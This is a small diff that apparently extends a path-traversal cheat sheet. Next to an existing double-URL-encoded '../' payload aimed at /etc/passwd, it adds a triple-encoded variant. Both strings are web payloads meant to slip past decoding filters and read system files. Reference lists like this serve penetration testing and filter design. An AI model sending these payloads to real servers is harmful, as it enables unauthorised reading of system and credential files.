@@ -24,3 +24,8 @@
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```
 > Doble encoding ../../../../../../etc/passwd
+
+```
+%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%252fpasswd
+```
+> Triple encoding
